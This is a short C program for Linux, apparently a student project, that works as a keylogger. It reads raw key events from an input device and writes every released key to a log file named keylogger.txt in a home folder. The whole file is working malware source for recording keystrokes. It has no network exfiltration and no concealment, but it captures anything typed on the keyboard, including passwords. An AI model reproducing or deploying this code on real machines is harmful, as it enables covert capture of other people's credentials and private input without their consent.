
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <sys/stat.h>

//#define LOGFILE "/tmp/data"
#define LOGFILE "/home/angi/PSO_P/keylogger.txt"

int main(int argc, char **argv)
{
	struct input_event ev;
	int fd = open("/dev/input/event1", O_RDONLY);
	FILE *fp = fopen(LOGFILE, "a");
	if(fp == NULL)
	{
		printf("File %s doesn't exist.\n", LOGFILE);
		return -1;
	}
	char *map = "..1234567890-=..qwertyuiop{}..asdfghjkl;'...zxcvbnm,./";
	//printf("before\n");
	while(1)
	{
		//printf("inside\n");
		read(fd, &ev, sizeof(ev));
		//printf("afterRead\n");
		if ((ev.type == EV_KEY) && (ev.value == 0))
		{
			fflush(fp);
			switch(ev.code)
			{
				case 28:
					fprintf(fp, "\n");
					break;
				case 57:
					fprintf(fp, " ");
					break;
				default:
					fprintf(fp, "%c", map[ev.code]);
			}
		}
	}
	fclose(fp);
	close(fd);
}
